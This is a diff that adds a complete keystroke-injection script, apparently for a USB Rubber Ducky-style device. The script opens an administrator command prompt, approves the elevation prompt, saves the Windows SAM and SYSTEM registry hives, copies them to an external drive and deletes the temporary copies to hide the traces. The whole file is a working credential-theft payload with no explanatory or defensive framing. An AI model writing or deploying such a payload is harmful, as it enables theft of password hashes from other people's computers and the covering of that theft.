@@ -1,0 +1,33 @@
+DELAY 3000
+REM Open Command Prompt as Administrator
+CONTROL ESCAPE
+DELAY 500
+STRING cmd
+DELAY 500
+CONTROL SHIFT ENTER
+DELAY 1000
+ALT Y
+DELAY 500
+
+REM Save SAM and SYSTEM hives
+STRING reg save hklm\sam C:\Windows\Temp\sam.save
+ENTER
+DELAY 500
+STRING reg save hklm\system C:\Windows\Temp\system.save
+ENTER
+DELAY 500
+
+REM Copy SAM and SYSTEM to external drive
+STRING copy C:\Windows\Temp\sam.save E:\sam.save
+ENTER
+DELAY 500
+STRING copy C:\Windows\Temp\system.save E:\system.save
+ENTER
+DELAY 500
+
+REM Clean up saved files from Temp folder
+STRING del C:\Windows\Temp\sam.save
+ENTER
+DELAY 500
+STRING del C:\Windows\Temp\system.save
+ENTER
